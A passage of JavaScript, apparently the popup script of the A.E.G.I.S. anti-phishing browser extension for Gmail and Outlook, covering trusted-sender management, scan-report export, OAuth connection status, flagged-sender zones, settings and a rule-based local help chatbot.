  const latest = await chrome.storage.local.get(["contactWhitelist", "trustedMessageOverrides", "scanResultsByEmail"]);
  const updated = (latest.contactWhitelist || []).filter(itemEmail => itemEmail.toLowerCase() !== email.toLowerCase());
  const updatedMessages = (latest.trustedMessageOverrides || []).filter(key => key !== getTrustedMessageKey(email, subject));
  const results = latest.scanResultsByEmail || {};
  delete results[email.toLowerCase()];
  if (scanCacheKeyEmail) delete results[String(scanCacheKeyEmail).toLowerCase()];
  await chrome.storage.local.set({ contactWhitelist: updated, trustedMessageOverrides: updatedMessages, scanResultsByEmail: results });
  await chrome.storage.local.remove("lastScan");
  await renderTrustedSenders();
  const currentKey = currentEmail?.toLowerCase();
  if (rescanCurrent && activeTabId && (currentKey === email.toLowerCase() || currentKey === String(scanCacheKeyEmail).toLowerCase())) {
    await requestManualScan(isTrustedMessage ? "Message trust removed. Restoring Outlook partial-scan checks…" : "Trust removed. Rescanning with normal sender checks…");
  }
}

function buildScanReport(result) {
  const linkHosts = (result.links || []).map(link => {
    try { return new URL(link.href || link).hostname; } catch (e) { return "unparseable-link"; }
  });
  return {
    product: "A.E.G.I.S.",
    version: ENGINE_VERSION,
    exportedAt: new Date().toISOString(),
    reportId: `AEGIS-${Date.now()}-${Math.random().toString(16).slice(2, 8).toUpperCase()}`,
    sender: result.senderAddressUnavailable ? result.senderLabel : result.email,
    senderDisplayName: result.senderDisplayName || null,
    visibleReplyTo: result.replyToEmail || null,
    senderIdentityEvidence: result.senderIdentity || null,
    unicodeEvidence: result.unicodeEvidence || null,
    subject: result.subject || currentSubject,
    coverage: result.scanCoverage || { mode: result.senderAddressUnavailable ? "partial" : "full" },
    scanDurationMs: result.scanDurationMs ?? null,
    score: result.score,
    outcome: result.outcome,
    verdict: result.verdict,
    deductions: (result.breakdown || []).filter(item => typeof item.delta === "number" && item.delta < 0),
    statistics: result.stats,
    aiClassification: result.aiClassification || null,
    linkHosts,
    attachmentNames: (result.attachments || []).map(item => item.name || "unnamed")
  };
}

function downloadLocalReport(bytes, mimeType, filename) {
  const blob = new Blob([bytes], { type: mimeType });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = filename;
  anchor.click();
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}

function exportScanReport(result) {
  downloadLocalReport(JSON.stringify(buildScanReport(result), null, 2), "application/json", `AEGIS-scan-report-${Date.now()}.json`);
}

function exportPdfScanReport(result) {
  downloadLocalReport(createAegisPdfBytes(buildScanReport(result)), "application/pdf", `AEGIS-forensic-report-${Date.now()}.pdf`);
}

function renderScanFailure(diagnostic) {
  currentResult = null;
  contentEl.innerHTML = `
    <div class="pd-failure-card">
      <h2>⚠️ Scan could not be completed</h2>
      <p>A.E.G.I.S. could not read the expected message structure. Retry the scan or copy diagnostics for troubleshooting.</p>
      <div class="pd-result-actions">
        <button id="retryFailedScanBtn" class="pd-btn pd-btn-primary" type="button">Retry scan</button>
        <button id="copyDiagnosticsBtn" class="pd-btn" type="button">Copy diagnostics</button>
      </div>
    </div>
  `;
  document.getElementById("retryFailedScanBtn").addEventListener("click", () => {
    requestManualScan("Retrying scan…");
  });
  document.getElementById("copyDiagnosticsBtn").addEventListener("click", async (event) => {
    const safeDiagnostic = { ...diagnostic, email: diagnostic.email ? "[redacted]" : undefined, subject: diagnostic.subject ? "[redacted]" : undefined };
    const text = JSON.stringify(safeDiagnostic, null, 2);
    try {
      await navigator.clipboard.writeText(text);
      event.target.textContent = "Copied";
    } catch (error) {
      window.prompt("Copy these diagnostics:", text);
    }
  });
}

async function renderTrustedSenders() {
  const { contactWhitelist = [] } = await chrome.storage.local.get("contactWhitelist");
  trustedSenderList.innerHTML = "";
  trustedSenderEmpty.classList.toggle("pd-hidden", contactWhitelist.length > 0);
  for (const email of contactWhitelist.sort((a, b) => a.localeCompare(b))) {
    const item = document.createElement("li");
    item.className = "pd-trusted-item";
    const label = document.createElement("span");
    label.textContent = email;
    const remove = document.createElement("button");
    remove.type = "button";
    remove.className = "pd-btn pd-remove-trust";
    remove.textContent = "Remove trust";
    remove.addEventListener("click", () => removeTrust(email, false));
    item.append(label, remove);
    trustedSenderList.appendChild(item);
  }
}

function parseTrustedMessageKey(key) {
  const value = String(key || "");
  const divider = value.indexOf("|");
  return {
    emailKey: divider >= 0 ? value.slice(0, divider) : value,
    subject: divider >= 0 ? value.slice(divider + 1) : "Outlook message"
  };
}

async function renderTrustedMessages() {
  if (!trustedMessageList || !trustedMessageEmpty) return;
  const { trustedMessageOverrides = [] } = await chrome.storage.local.get("trustedMessageOverrides");
  trustedMessageList.innerHTML = "";
  trustedMessageEmpty.classList.toggle("pd-hidden", trustedMessageOverrides.length > 0);

  for (const key of trustedMessageOverrides.slice().reverse()) {
    const parsed = parseTrustedMessageKey(key);
    const item = document.createElement("li");
    item.className = "pd-trusted-item";
    const label = document.createElement("span");
    label.className = "pd-trusted-message-label";
    const title = document.createElement("strong");
    title.textContent = "Outlook message";
    const subject = document.createElement("small");
    subject.textContent = parsed.subject || "Subject unavailable";
    label.append(title, subject);
    const remove = document.createElement("button");
    remove.type = "button";
    remove.className = "pd-btn pd-remove-trust";
    remove.textContent = "Remove trust";
    remove.addEventListener("click", async () => {
      const latest = await chrome.storage.local.get(["trustedMessageOverrides", "scanResultsByEmail"]);
      const updated = (latest.trustedMessageOverrides || []).filter(itemKey => itemKey !== key);
      const results = latest.scanResultsByEmail || {};
      delete results[String(parsed.emailKey || "").toLowerCase()];
      await chrome.storage.local.set({ trustedMessageOverrides: updated, scanResultsByEmail: results });
      await chrome.storage.local.remove("lastScan");
      await renderTrustedMessages();
    });
    item.append(label, remove);
    trustedMessageList.appendChild(item);
  }
}

function privacyActivityDescription(event) {
  if (event.type === "DNS_LOOKUP") return `SPF/DMARC publication lookup · ${event.domain || "domain unavailable"}`;
  if (event.type === "RDAP_LOOKUP") return `${event.purpose || "Domain age"} lookup · ${event.domain || "domain unavailable"}`;
  if (event.type === "GMAIL_HEADER_LOOKUP") return "Gmail provider authentication header lookup";
  if (event.type === "OUTLOOK_MESSAGE_MATCH_LOOKUP") return "Outlook subject-search message identification";
  if (event.type === "OUTLOOK_HEADER_LOOKUP") return "Outlook provider sender/authentication header lookup";
  return `Local message scan${event.platform ? ` · ${event.platform}` : ""}`;
}

async function renderPrivacyActivity() {
  if (!privacyActivityList || !privacyActivityEmpty) return;
  const { privacyActivityLog = [] } = await chrome.storage.local.get("privacyActivityLog");
  privacyActivityList.innerHTML = "";
  privacyActivityEmpty.classList.toggle("pd-hidden", privacyActivityLog.length > 0);

  for (const event of privacyActivityLog.slice(0, 30)) {
    const item = document.createElement("li");
    item.className = `pd-privacy-item pd-privacy-${String(event.type || "local").toLowerCase()}`;
    const title = document.createElement("strong");
    title.textContent = privacyActivityDescription(event);
    const meta = document.createElement("span");
    meta.textContent = `${event.provider || "A.E.G.I.S."} · ${new Date(event.ts || Date.now()).toLocaleString()}`;
    const boundary = document.createElement("small");
    boundary.textContent = event.headerMetadataAccessed
      ? "Email body: Not accessed · Provider metadata: Accessed · Raw MIME: Not accessed"
      : "Email body uploaded: No · Header metadata: Not accessed";
    item.append(title, meta, boundary);
    privacyActivityList.appendChild(item);
  }
}

function sendRuntimeRequest(type) {
  return new Promise(resolve => {
    chrome.runtime.sendMessage({ type }, response => {
      const runtimeError = chrome.runtime.lastError?.message;
      if (runtimeError) resolve({ ok: false, error: runtimeError });
      else resolve(response || { ok: false, error: "No response from the extension worker." });
    });
  });
}

function paintGmailOAuthStatus(status, overrideMessage = "") {
  if (!gmailOAuthStatusEl || !gmailOAuthDot || !connectGmailBtn || !disconnectGmailBtn) return;
  gmailOAuthDot.classList.remove("pd-oauth-dot-connected", "pd-oauth-dot-error");
  connectGmailBtn.disabled = false;
  connectGmailBtn.classList.remove("pd-hidden");
  disconnectGmailBtn.classList.add("pd-hidden");

  if (!status?.configured) {
    gmailOAuthStatusEl.textContent = "Setup required";
    gmailOAuthDot.classList.add("pd-oauth-dot-error");
    connectGmailBtn.disabled = true;
    gmailOAuthMessage.textContent = overrideMessage || "Add the public Google OAuth Client ID to manifest.json before connecting. Never add a client secret.";
    return;
  }
  if (status.connected) {
    gmailOAuthStatusEl.textContent = "Gmail connected";
    gmailOAuthDot.classList.add("pd-oauth-dot-connected");
    connectGmailBtn.classList.add("pd-hidden");
    disconnectGmailBtn.classList.remove("pd-hidden");
    gmailOAuthMessage.textContent = overrideMessage || "Verified Header Mode is active. New Gmail rescans can show provider SPF, DKIM and DMARC results.";
    return;
  }
  gmailOAuthStatusEl.textContent = status.enabled ? "Reconnect required" : "Not connected";
  if (status.enabled) gmailOAuthDot.classList.add("pd-oauth-dot-error");
  gmailOAuthMessage.textContent = overrideMessage || status.error || "Standard local scanning remains active. Connect only if you want message-level Gmail authentication results.";
}

async function renderGmailOAuthStatus() {
  const response = await sendRuntimeRequest("GMAIL_OAUTH_STATUS");
  if (!response.ok) {
    paintGmailOAuthStatus({ configured: true, connected: false, enabled: true }, response.error || "Could not check Gmail connection.");
    return;
  }
  paintGmailOAuthStatus(response.status);
}

function paintOutlookOAuthStatus(status, overrideMessage = "") {
  if (!outlookOAuthStatusEl || !outlookOAuthDot || !connectOutlookBtn || !disconnectOutlookBtn) return;
  outlookOAuthDot.classList.remove("pd-oauth-dot-connected", "pd-oauth-dot-error");
  connectOutlookBtn.disabled = false;
  connectOutlookBtn.classList.remove("pd-hidden");
  disconnectOutlookBtn.classList.add("pd-hidden");

  if (!status?.configured) {
    outlookOAuthStatusEl.textContent = "Setup required";
    outlookOAuthDot.classList.add("pd-oauth-dot-error");
    connectOutlookBtn.disabled = true;
    outlookOAuthMessage.textContent = overrideMessage || `Create a Microsoft Entra public client and add its Application (client) ID. Redirect URI: ${status?.redirectUri || "the extension redirect URI in MICROSOFT_OAUTH_SETUP.md"}. Never add a client secret.`;
    return;
  }
  if (status.connected) {
    outlookOAuthStatusEl.textContent = "Outlook connected";
    outlookOAuthDot.classList.add("pd-oauth-dot-connected");
    connectOutlookBtn.classList.add("pd-hidden");
    disconnectOutlookBtn.classList.remove("pd-hidden");
    outlookOAuthMessage.textContent = overrideMessage || "Verified Header Mode is active for Outlook. Tokens remain only in this browser session.";
    return;
  }
  outlookOAuthStatusEl.textContent = status.enabled ? "Reconnect required" : "Not connected";
  if (status.enabled) outlookOAuthDot.classList.add("pd-oauth-dot-error");
  outlookOAuthMessage.textContent = overrideMessage || status.error || "Standard local scanning remains active. Connect only if you want Microsoft-reported sender and authentication evidence.";
}

async function renderOutlookOAuthStatus() {
  const response = await sendRuntimeRequest("OUTLOOK_OAUTH_STATUS");
  if (!response.ok) {
    paintOutlookOAuthStatus({ configured: true, connected: false, enabled: true }, response.error || "Could not check Outlook connection.");
    return;
  }
  paintOutlookOAuthStatus(response.status);
}

function renderEmpty(msg) {
  contentEl.innerHTML = `<p class="muted">${msg}</p>`;
}

async function renderHistory(email) {
  const { dangerZoneLog = [] } = await chrome.storage.local.get("dangerZoneLog");
  const past = dangerZoneLog.filter(h => h.email.toLowerCase() === email.toLowerCase());
  if (past.length === 0) {
    historySection.classList.add("pd-hidden");
    return;
  }
  historySection.classList.remove("pd-hidden");
  historyList.innerHTML = past
    .slice(0, 10)
    .map(h => `<li>Flagged at score ${h.score}/100<span class="pd-history-date">${new Date(h.ts).toLocaleString()}</span></li>`)
    .join("");
}

// Issue #6 fix: look up the per-email result map instead of a single
// global "last write wins" key, and render directly, called both on
// popup init and whenever storage changes while the popup stays open.
async function loadAndRenderCurrentEmail() {
  if (!currentEmail) return;
  const { scanResultsByEmail = {} } = await chrome.storage.local.get("scanResultsByEmail");
  const result = scanResultsByEmail[currentEmail.toLowerCase()];
  if (result && result.engineVersion === ENGINE_VERSION && result.subjectKey === String(currentSubject || "").trim().toLowerCase()) {
    renderResult(result);
    renderHistory(currentEmail);
    renderZoneList();
  }
}

// ---------- Zones tab rendering ----------

async function renderZoneList() {
  const { dangerZoneLog = [], moderateZoneLog = [] } = await chrome.storage.local.get(["dangerZoneLog", "moderateZoneLog"]);
  dangerCountEl.textContent = dangerZoneLog.length;
  moderateCountEl.textContent = moderateZoneLog.length;

  const items = currentZone === "danger" ? dangerZoneLog : moderateZoneLog;
  if (items.length === 0) {
    zoneList.innerHTML = "";
    zoneEmpty.classList.remove("pd-hidden");
    return;
  }
  zoneEmpty.classList.add("pd-hidden");
  zoneList.innerHTML = items.map((item, index) => `
    <li class="pd-zone-item ${currentZone === "moderate" ? "pd-zone-item-moderate" : ""}">
      <div class="pd-zone-item-email">${escapeHtml(item.email)}</div>
      <div class="pd-zone-item-subject">${escapeHtml(item.subject) || "(no subject captured)"}</div>
      <div class="pd-zone-item-meta">
        <span>Score: ${item.score}/100</span>
        <span>${new Date(item.ts).toLocaleString()}</span>
      </div>
      <button class="pd-zone-delete pd-btn" data-index="${index}" type="button">Delete</button>
    </li>
  `).join("");
  zoneList.querySelectorAll(".pd-zone-delete").forEach(button => {
    button.addEventListener("click", async () => {
      const key = currentZone === "danger" ? "dangerZoneLog" : "moderateZoneLog";
      const stored = await chrome.storage.local.get(key);
      const updated = stored[key] || [];
      updated.splice(Number(button.dataset.index), 1);
      await chrome.storage.local.set({ [key]: updated });
    });
  });
}

document.getElementById("clearZoneBtn").addEventListener("click", async () => {
  const key = currentZone === "danger" ? "dangerZoneLog" : "moderateZoneLog";
  await chrome.storage.local.set({ [key]: [] });
});

// ---------- Live updates while popup is open ----------
// Fixes the "stuck on Scanning…" issue: previously the popup checked
// storage exactly once at open time. If the scan hadn't finished yet (or
// belonged to a different message in a thread), it never updated again.
chrome.storage.onChanged.addListener((changes, area) => {
  if (area !== "local") return;
  if (changes.scanResultsByEmail) loadAndRenderCurrentEmail();
  if (changes.dangerZoneLog || changes.moderateZoneLog) renderZoneList();
  if (changes.contactWhitelist) renderTrustedSenders();
  if (changes.trustedMessageOverrides) renderTrustedMessages();
  if (changes.privacyActivityLog) renderPrivacyActivity();
  if (changes.lastScanError?.newValue && diagnosticMatchesCurrentMessage(changes.lastScanError.newValue)) {
    renderScanFailure(changes.lastScanError.newValue);
  }
});

// ---------- Help chatbot (replaces the old Help tab) ----------
// Rule-based, no external API: answers are generated from this popup's own
// live state (currentResult, currentEmail, zone counts, settings) plus the
// same knowledge that used to live in the About/Help tabs.

const chatFabBtn = document.getElementById("chatFabBtn");
const chatFabDot = document.getElementById("chatFabDot");
const chatPanel = document.getElementById("chatPanel");
const chatCloseBtn = document.getElementById("chatCloseBtn");
const chatMessages = document.getElementById("chatMessages");
const chatQuickReplies = document.getElementById("chatQuickReplies");
const chatForm = document.getElementById("chatForm");
const chatInput = document.getElementById("chatInput");

let chatOpened = false;

function chatAppend(text, who = "bot") {
  if (!chatMessages) return;
  const bubble = document.createElement("div");
  bubble.className = `pd-chat-msg pd-chat-msg-${who}`;
  bubble.textContent = text;
  chatMessages.appendChild(bubble);
  chatMessages.scrollTop = chatMessages.scrollHeight;
}

const CHAT_QUICK_REPLIES = [
  { label: "What's my score?", q: "what is my score" },
  { label: "Why was this flagged?", q: "why was this flagged" },
  { label: "What does SPF/DKIM/DMARC mean?", q: "what does spf dkim dmarc mean" },
  { label: "How do I trust a sender?", q: "how do i trust a sender" },
  { label: "Is my data private?", q: "is my data private" },
  { label: "How do I scan an email?", q: "how do i scan an email" }
];

function renderChatQuickReplies() {
  if (!chatQuickReplies) return;
  chatQuickReplies.innerHTML = "";
  CHAT_QUICK_REPLIES.forEach(item => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "pd-chat-quick-reply";
    btn.textContent = item.label;
    btn.addEventListener("click", () => handleChatQuestion(item.q, item.label));
    chatQuickReplies.appendChild(btn);
  });
}

function openChatPanel() {
  chatPanel?.classList.remove("pd-hidden");
  chatFabDot?.classList.add("pd-hidden");
  if (!chatOpened) {
    chatOpened = true;
    chatAppend(
      "Hi! I'm the A.E.G.I.S. assistant. I can explain the currently scanned email, what SPF/DKIM/DMARC and the trust score mean, or how to use the extension — all answered locally from this popup, no data leaves your device.",
      "bot"
    );
    renderChatQuickReplies();
  }
  chatInput?.focus();
}

function closeChatPanel() {
  chatPanel?.classList.add("pd-hidden");
}

chatFabBtn?.addEventListener("click", () => {
  const isOpen = !chatPanel?.classList.contains("pd-hidden");
  if (isOpen) closeChatPanel(); else openChatPanel();
});
chatCloseBtn?.addEventListener("click", closeChatPanel);

function currentScoreSummary() {
  if (!currentResult) return null;
  const r = currentResult;
  const label = OUTCOME_LABELS[r.outcome] || r.outcome;
  return { score: r.score, label, sender: r.senderLabel || r.email, verdict: r.verdict };
}

function chatAnswerFor(question) {
  const q = question.toLowerCase();

  // Live-data questions first (these need currentResult context).
  if (/(my score|current score|trust score|what.*score)/.test(q)) {
    const summary = currentScoreSummary();
    if (!summary) return "No email is scanned yet in this popup. Open an email in Gmail or Outlook, or use the Scan tab, and I can tell you its score.";
    return `The currently open email from ${summary.sender} scored ${summary.score}/100 — "${summary.label}". ${summary.verdict?.message || ""}`.trim();
  }
  if (/(why.*flagged|why.*quarantine|why.*warning|why.*risky|why.*suspicious)/.test(q)) {
    const r = currentResult;
    if (!r) return "No email is scanned yet, so there's nothing flagged right now. Open or scan an email first.";
    const deductions = (r.breakdown || []).filter(d => typeof d.delta === "number" && d.delta < 0);
    if (!deductions.length) return `This email scored ${r.score}/100 with no deductions applied — nothing was flagged.`;
    const top = deductions.slice(0, 3).map(d => `${d.label} (${d.delta})`).join(", ");
    return `It scored ${r.score}/100 mainly because of: ${top}${deductions.length > 3 ? `, and ${deductions.length - 3} more` : ""}. Open the "How the score was calculated" and "Risk factor breakdown" cards on the Home tab and tap any line for a full explanation.`;
  }
  if (/(spf|dkim|dmarc)/.test(q)) {
    const stats = currentResult?.stats;
    let live = "";
    if (stats) {
      live = ` For the currently open email: SPF ${stats.spfStatus || "unknown"}, DKIM ${stats.dkimStatus || "unknown"}, DMARC ${stats.dmarcStatus || "unknown"}. Tap the SPF/DKIM/DMARC chip in the Home tab's "Domain authentication posture" card for a full breakdown.`;
    }
    return "SPF, DKIM and DMARC are email authentication standards. SPF lists which servers may send for a domain, DKIM cryptographically signs messages so tampering can be detected, and DMARC tells receiving servers what to do when SPF/DKIM fail." + live;
  }
  if (/(danger zone|moderate zone|zones? tab|flagged senders)/.test(q)) {
    return "The Zones tab groups every flagged sender into a Danger Zone (high risk) or Moderate Zone (worth a second look) instead of moving mail into a real folder. Open the Zones tab to browse or clear them.";
  }
  if (/(trust.*sender|whitelist|remove trust)/.test(q)) {
    return "On a scanned email's result, use \"Trust this sender\" (or, if already trusted, \"Remove trust\") to add or remove them from your whitelist. Trusted senders skip reputation penalties, but their links, content and attachments are still checked. Manage the full list under Settings → Trusted senders.";
  }
  if (/(scan|rescan).*email|how do i scan/.test(q)) {
    return "Open the email in Gmail or Outlook — if auto-scan is on (Settings tab) it scans automatically. Otherwise, use the \"Scan this email\" button on the Scan tab, or the Rescan control in the email header itself.";
  }
  if (/(private|privacy|data|upload|sent.*server)/.test(q)) {
    return "No email body content is ever uploaded. Domain checks use anonymous DNS/RDAP lookups on the sending domain only. Optional Gmail/Outlook Verified Header Mode reads only specific metadata headers with your consent. See Settings → 🔒 Privacy activity log for every A.E.G.I.S.-initiated network request.";
  }
  if (/(ai|model|logistic|language analysis)/.test(q)) {
    const ai = currentResult?.aiClassification;
    if (ai?.available) {
      const percent = typeof ai.probabilityPercent === "number" ? ai.probabilityPercent : Math.round((ai.probability || 0) * 1000) / 10;
      return `A local TF-IDF + Logistic Regression model checks message wording for phishing-style language, entirely on-device. For the current email it estimated ${percent}% phishing-language probability (${ai.band || "unknown"} band). It's one supporting signal among several, never the sole reason for a verdict.`;
    }
    return "AI language analysis runs a local TF-IDF + Logistic Regression model over the message text, entirely on-device, to estimate how closely the wording resembles known phishing language. It's a supporting signal, not a verdict on its own.";
  }
  if (/(about|what is aegis|what does aegis do)/.test(q)) {
    return "A.E.G.I.S. (Anti-Phishing Email Gateway & Intelligence System) checks Gmail/Outlook mail for spoofing and phishing on-device, giving every email a 0–100 explainable trust score instead of a binary block/allow. See Settings → ℹ️ About A.E.G.I.S. for the full breakdown.";
  }
  if (/(dashboard|website|web app)/.test(q)) {
    return "The web dashboard (button in the top-right of this popup) has more background on the project and its architecture.";
  }
  if (/(dark mode|light mode|theme)/.test(q)) {
    return "Use the 🌙/☀️ toggle next to the Dashboard button in the header to switch between light and dark appearance — it's remembered for next time.";
  }
  if (/(attachment)/.test(q)) {
    return "Attachments are checked by filename/extension only — for executable, script, and macro-capable file types, and for double-extension tricks. Tap an attachment-related line in the Risk factor breakdown for detail.";
  }
  if (/(link|url)/.test(q)) {
    return "Links are checked for their real destination, redirects, and punycode/homoglyph lookalikes. \"Protected Click\" pauses before you navigate to a suspicious link and shows you the real destination first.";
  }
  return null;
}

function handleChatQuestion(question, displayText) {
  chatAppend(displayText || question, "user");
  const answer = chatAnswerFor(question);
  window.setTimeout(() => {
    chatAppend(
      answer || "I'm not sure about that one — I can only answer from this popup's own data and the built-in help topics. Try asking about your score, SPF/DKIM/DMARC, zones, trusting a sender, or privacy.",
      "bot"
    );
  }, 220);
}

chatForm?.addEventListener("submit", (event) => {
  event.preventDefault();
  const text = chatInput.value.trim();
  if (!text) return;
  chatInput.value = "";
  handleChatQuestion(text);
});

// ---------- Init ----------

async function init() {
  // BUG FIX (round-13): the About tab's version string was a hand-typed
  // literal in popup.html ("Version 0.12.0") that nobody remembered to bump
  // alongside manifest.json's real version — the two drifted apart (About
  // tab: 0.12.0 vs. the manifest / chrome://extensions "unpacked" version,
  // which was already several releases ahead). chrome.runtime.getManifest()
  // reads the actual installed manifest at runtime, so this can now never
  // go stale again — there is exactly one source of truth (manifest.json's
  // "version" field) and every surface that shows a version reads from it.
  const versionEl = document.getElementById("aboutVersion");
  if (versionEl) versionEl.textContent = chrome.runtime.getManifest().version;
  await Promise.all([renderGmailOAuthStatus(), renderOutlookOAuthStatus()]);

  // Issue #10: auto-scan (including URL scanning) now defaults ON, matching
  // content.js, so the open message scans itself without a click.
  const { autoScanEnabled = true, autoScanListEnabled = true } =
    await chrome.storage.local.get(["autoScanEnabled", "autoScanListEnabled"]);
  autoScanCheckbox.checked = autoScanEnabled;
  autoScanListCheckbox.checked = autoScanListEnabled;

  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab) return renderEmpty("Open Gmail or Outlook Web to get started.");
  activeTabId = tab.id;
  activeTabUrl = tab.url || "";

  chrome.tabs.sendMessage(tab.id, { type: "GET_OPEN_EMAILS" }, async (response) => {
    if (chrome.runtime.lastError || !response || !response.emails || response.emails.length === 0) {
      renderEmpty("Open an email in Gmail or Outlook to see its trust score here.");
      return;
    }
    const currentMessage = response.messages?.[0] || { email: response.emails[0], subject: "" };
    currentEmail = currentMessage.email;
    currentSubject = currentMessage.subject || "";

    const { scanResultsByEmail = {}, lastScanError = null } = await chrome.storage.local.get(["scanResultsByEmail", "lastScanError"]);
    const existing = scanResultsByEmail[currentEmail.toLowerCase()];
    if (existing && existing.engineVersion === ENGINE_VERSION && existing.subjectKey === currentSubject.trim().toLowerCase()) {
      renderResult(existing);
    } else if (diagnosticMatchesCurrentMessage(lastScanError)) {
      renderScanFailure(lastScanError);
    } else if (autoScanEnabled) {
      renderEmpty("Scanning sender, message content, links and public domain records…");
    } else {
      renderEmpty("Not yet scanned. Click the header inside the email, or use the Scan tab below, to check it.");
    }
    renderHistory(currentEmail);
  });

  renderZoneList();
  renderTrustedSenders();
  renderTrustedMessages();
  renderPrivacyActivity();
}

document.getElementById("openDashboardBtn")?.addEventListener("click", openAegisDashboard);
document.getElementById("openDashboardAboutBtn")?.addEventListener("click", openAegisDashboard);

// ---------- Scan + consent flow ----------

scanBtn.addEventListener("click", () => {
  if (!currentEmail) return;
  consentEmailEl.textContent = currentEmail;
  consentPanel.classList.remove("pd-hidden");
});

document.getElementById("consentDeny").addEventListener("click", () => {
  consentPanel.classList.add("pd-hidden");
});

document.getElementById("consentAllow").addEventListener("click", () => {
  consentPanel.classList.add("pd-hidden");
  requestManualScan("Scanning sender, message content, links and public domain records…");
});

// ---------- Settings ----------

autoScanCheckbox.addEventListener("change", () => {
  chrome.storage.local.set({ autoScanEnabled: autoScanCheckbox.checked });
});

autoScanListCheckbox.addEventListener("change", () => {
  chrome.storage.local.set({ autoScanListEnabled: autoScanListCheckbox.checked });
});

connectGmailBtn?.addEventListener("click", async () => {
  connectGmailBtn.disabled = true;
  gmailOAuthStatusEl.textContent = "Waiting for Google consent…";
  gmailOAuthMessage.textContent = "Choose the Gmail account shown in the open permission window.";
  const response = await sendRuntimeRequest("GMAIL_OAUTH_CONNECT");
  if (!response.ok) {
    paintGmailOAuthStatus({ configured: true, connected: false, enabled: false }, response.error || "Gmail connection was not completed.");
    return;
  }
  paintGmailOAuthStatus(response.status, "Connected with metadata-only access. Rescanning the open Gmail message now…");
  if (currentEmail && activeTabUrl.includes("mail.google.com")) {
    await requestManualScan("Reading Gmail's provider authentication results and rescanning…");
  }
});

disconnectGmailBtn?.addEventListener("click", async () => {
  disconnectGmailBtn.disabled = true;
  gmailOAuthStatusEl.textContent = "Disconnecting…";
  const response = await sendRuntimeRequest("GMAIL_OAUTH_DISCONNECT");
  if (!response.ok) {
    disconnectGmailBtn.disabled = false;
    gmailOAuthMessage.textContent = response.error || "Could not disconnect Gmail.";
    return;
  }
  await chrome.storage.local.remove(["scanResultsByEmail", "lastScan"]);
  paintGmailOAuthStatus(response.status, "Gmail permission was revoked. Standard local scanning is still active.");
  disconnectGmailBtn.disabled = false;
  if (currentEmail && activeTabUrl.includes("mail.google.com")) {
    await requestManualScan("Gmail disconnected. Rescanning in standard local mode…");
  }
});

connectOutlookBtn?.addEventListener("click", async () => {
  connectOutlookBtn.disabled = true;
  outlookOAuthStatusEl.textContent = "Waiting for Microsoft consent…";
  outlookOAuthMessage.textContent = "Choose your Microsoft account and approve Mail.ReadBasic in the permission window.";
  const response = await sendRuntimeRequest("OUTLOOK_OAUTH_CONNECT");
  if (!response.ok) {
    paintOutlookOAuthStatus({ configured: true, connected: false, enabled: false }, response.error || "Outlook connection was not completed.");
    return;
  }
  paintOutlookOAuthStatus(response.status, "Connected for this browser session. Rescanning the open Outlook message now…");
  if (currentEmail && activeTabUrl.includes("outlook.")) {
    await requestManualScan("Reading Microsoft provider headers and rescanning…");
  }
});

disconnectOutlookBtn?.addEventListener("click", async () => {
  disconnectOutlookBtn.disabled = true;
  outlookOAuthStatusEl.textContent = "Disconnecting…";
  const response = await sendRuntimeRequest("OUTLOOK_OAUTH_DISCONNECT");
  if (!response.ok) {
    disconnectOutlookBtn.disabled = false;
    outlookOAuthMessage.textContent = response.error || "Could not disconnect Outlook.";
    return;
  }
  await chrome.storage.local.remove(["scanResultsByEmail", "lastScan"]);
  paintOutlookOAuthStatus(response.status, "The local Outlook session token was cleared. Standard local scanning is still active.");
  disconnectOutlookBtn.disabled = false;
  if (currentEmail && activeTabUrl.includes("outlook.")) {
    await requestManualScan("Outlook disconnected. Rescanning in standard local mode…");
  }
});

const clearCacheBtn = document.getElementById("clearCacheBtn");
if (clearCacheBtn) {
  clearCacheBtn.addEventListener("click", async () => {
    // Clears only the per-sender score cache (scanResultsByEmail/lastScan) —
    // deliberately NOT contactWhitelist, so trusted contacts stay trusted.
    // Useful after a fix that changes how a sender is identified: an old,
    // wrongly-keyed cache entry from before the fix can otherwise keep
    // showing a stale score for that sender indefinitely, since this cache
    // has no TTL (it's pruned by count, not by age).
    await chrome.storage.local.remove(["scanResultsByEmail", "lastScan"]);
    clearCacheBtn.textContent = "Cleared";
    clearCacheBtn.disabled = true;
    setTimeout(() => {
      clearCacheBtn.textContent = "Clear scan cache";
      clearCacheBtn.disabled = false;
    }, 1500);
    if (currentEmail) await loadAndRenderCurrentEmail();
  });
}

if (clearPrivacyLogBtn) {
  clearPrivacyLogBtn.addEventListener("click", async () => {
    await chrome.storage.local.set({ privacyActivityLog: [] });
    clearPrivacyLogBtn.textContent = "Activity log cleared";
    setTimeout(() => { clearPrivacyLogBtn.textContent = "Clear activity log"; }, 1500);
  });
}

init();
